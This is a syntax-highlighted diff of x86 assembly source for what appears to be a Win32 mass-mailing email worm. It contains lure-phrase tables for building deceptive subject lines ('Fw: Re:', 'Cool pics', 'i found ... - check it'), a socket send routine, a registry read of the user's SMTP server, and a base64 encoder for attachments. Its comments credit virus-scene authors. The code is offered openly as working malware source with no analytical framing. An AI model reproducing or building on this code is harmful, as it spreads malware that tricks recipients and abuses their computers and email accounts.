+</span><span class="sc5">__l</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
+                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__b</span><span class="sc0">
+</span><span class="sc5">__f</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">lodsb</span><span class="sc0">
+                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
+                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">__f</span><span class="sc0">
+                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">__l</span><span class="sc0">
+
+</span><span class="sc5">__b</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">lodsb</span><span class="sc0">
+                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__d</span><span class="sc0">
+                </span><span class="sc6">stosb</span><span class="sc0">
+                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__b</span><span class="sc0">
+</span><span class="sc5">__d</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc0">
+                </span><span class="sc6">stosb</span><span class="sc0">
+                
+</span><span class="sc5">__g</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">lodsb</span><span class="sc0">
+                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__g</span><span class="sc0">
+                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc0">
+                </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">__g</span><span class="sc0">
+                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
+                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">hehe</span><span class="sc0">
+
+</span><span class="sc5">done</span><span class="sc4">:</span><span class="sc0">
+                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+                </span><span class="sc6">stosb</span><span class="sc0">
+                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
+                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
+                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">stringsend</span><span class="sc0">
+                </span><span class="sc6">popad</span><span class="sc0">
+                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">gsxx</span><span class="sc0">
+ 
+</span><span class="sc5">gendata</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">5</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Fw:"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Fw: Re:"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+
+        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">11</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Cool"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Nice"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Hot"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"some"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Funny"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"weird"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"funky"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"great"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Interesting"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"many"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+
+        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"website"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"site"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"pics"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"urls"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"pictures"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"stuff"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"mp3s"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"shit"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"music"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"info"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+
+        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">7</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"to check"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"for you"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"i found"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"to see"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"here"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"- check it"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
+        
+        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">6</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"!!"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"!"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">":-)"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">;lets use lame cool-to-newbies smileys ;P</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"?!"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"hehe ;-)"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
+
+        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">31</span><span class="sc0">              </span><span class="sc1">;terminator</span><span class="sc0">
+
+        
+</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
+
+</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
+</span><span class="sc5">stringsend</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
+
+                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
+                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
+
+</span><span class="sc5">__x</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">lodsb</span><span class="sc0">
+                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
+                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
+                </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">__x</span><span class="sc0">
+               
+                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
+
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">;flags</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">;length</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                     </span><span class="sc1">;datastart</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                     </span><span class="sc1">;handle</span><span class="sc0">
+                </span><span class="sc5">_call</span><span class="sc0">   </span><span class="sc5">send</span><span class="sc0">
+
+                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
+
+</span><span class="sc1">;                push    10</span><span class="sc0">
+</span><span class="sc1">;                _call   Sleep</span><span class="sc0">
+
+                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
+                </span><span class="sc6">ret</span><span class="sc0">
+</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
+
+</span><span class="sc5">get_rnd_range</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">;luv to griyo</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
+                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
+                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd32</span><span class="sc0">
+                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
+                </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
+                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
+                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
+                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
+                </span><span class="sc6">ret</span><span class="sc0">
+
+
+</span><span class="sc5">get_rnd32</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">;Stolen from prizzy's Crypto</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
+                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.rnd32seed</span><span class="sc4">]</span><span class="sc0">
+                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">41C64E6Dh</span><span class="sc0">
+        </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
+        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
+                </span><span class="sc5">_call</span><span class="sc0">    </span><span class="sc5">GetTickCount</span><span class="sc0">
+        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
+                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">31h</span><span class="sc0">                </span><span class="sc1">;RDTCS instruction - read</span><span class="sc0">
+        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
+        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;PCs ticks to EDX:EAX</span><span class="sc0">
+        </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
+        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00003039h</span><span class="sc0">
+                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.rnd32seed</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
+        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
+        </span><span class="sc6">ret</span><span class="sc0">
+
+</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
+
+</span><span class="sc5">encodebase64</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">; encodeBase64 by Bumblebee. All rights reserved ;)</span><span class="sc0">
+</span><span class="sc1">; input:</span><span class="sc0">
+</span><span class="sc1">;       EAX = Address of data to encode</span><span class="sc0">
+</span><span class="sc1">;       EDX = Address to put encoded data</span><span class="sc0">
+</span><span class="sc1">;       ECX = Size of data to encode</span><span class="sc0">
+</span><span class="sc1">; output:</span><span class="sc0">
+</span><span class="sc1">;       ECX = size of encoded data</span><span class="sc0">
+</span><span class="sc1">;</span><span class="sc0">
+        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0"> 
+        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">over_enc_table</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"abcdefghijklmnopqrstuvwxyz"</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"0123456789+/"</span><span class="sc0">
+</span><span class="sc5">over_enc_table</span><span class="sc4">:</span><span class="sc0">
+        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
+        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
+</span><span class="sc5">baseLoop</span><span class="sc4">:</span><span class="sc0">
+        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
+        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
+        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">00111111b</span><span class="sc0">
+        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
+        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">bh</span><span class="sc0">
+        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
+
+        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
+        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">bh</span><span class="sc0">
+        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
+        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">00111111b</span><span class="sc0">
+        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
+        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">bh</span><span class="sc0">
+        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
+
+        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
+        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
+        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">bh</span><span class="sc0">
+        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
+        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc8">bh</span><span class="sc0">
+        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">00111111b</span><span class="sc0">
+        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
+        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">bh</span><span class="sc0">
+        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
+
+        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
+        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
+        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
+        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">00111111b</span><span class="sc0">
+        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
+        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">bh</span><span class="sc0">
+        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
+        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
+
+        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
+        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc2">24</span><span class="sc0">
+        </span><span class="sc6">jna</span><span class="sc0">     </span><span class="sc5">DontAddEndOfLine</span><span class="sc0">
+
+        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">                         </span><span class="sc1">; add a new line</span><span class="sc0">
+        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">0A0Dh</span><span class="sc0">
+        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
+        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
+        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">                          </span><span class="sc1">; Optimized (overlap rlz!)</span><span class="sc0">
+        </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
+</span><span class="sc5">DontAddEndOfLine</span><span class="sc4">:</span><span class="sc0">
+        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
+        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
+        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
+        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">baseLoop</span><span class="sc0">
+
+        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
+        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
+        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
+        </span><span class="sc6">ret</span><span class="sc0">
+</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
+
+</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
+</span><span class="sc5">readregkey</span><span class="sc4">:</span><span class="sc0">
+                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ebp.regkeyhnd</span><span class="sc4">]</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">80000001h</span><span class="sc0">  </span><span class="sc1">;hkey current user</span><span class="sc0">
+                </span><span class="sc5">_call</span><span class="sc0">   </span><span class="sc5">RegCreateKeyA</span><span class="sc0">
+                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
+                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">rrke</span><span class="sc0">      
+
+</span><span class="sc5">more_data</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">127</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
+                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">ebp.buffer</span><span class="sc4">]</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">ebp.regkeyhnd</span><span class="sc4">]</span><span class="sc0">
+                </span><span class="sc5">_call</span><span class="sc0">   </span><span class="sc5">RegQueryValueExA</span><span class="sc0">               </span><span class="sc1">;read stmp server</span><span class="sc0">
+                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
+                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">234</span><span class="sc0">
+                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">more_data</span><span class="sc0">               </span><span class="sc1">;??</span><span class="sc0">
+                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
+                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">rrke</span><span class="sc0">       
+
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">ebp.regkeyhnd</span><span class="sc4">]</span><span class="sc0">
+                </span><span class="sc5">_call</span><span class="sc0">   </span><span class="sc5">RegCloseKey</span><span class="sc0">
+                </span><span class="sc6">clc</span><span class="sc0">
+                </span><span class="sc6">ret</span><span class="sc0">     </span><span class="sc2">8</span><span class="sc0">
+
+</span><span class="sc5">rrke</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">stc</span><span class="sc0">
+                </span><span class="sc6">ret</span><span class="sc0">     </span><span class="sc2">8</span><span class="sc0">
+</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
+
+</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
+</span><span class="sc5">openfile</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
+                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
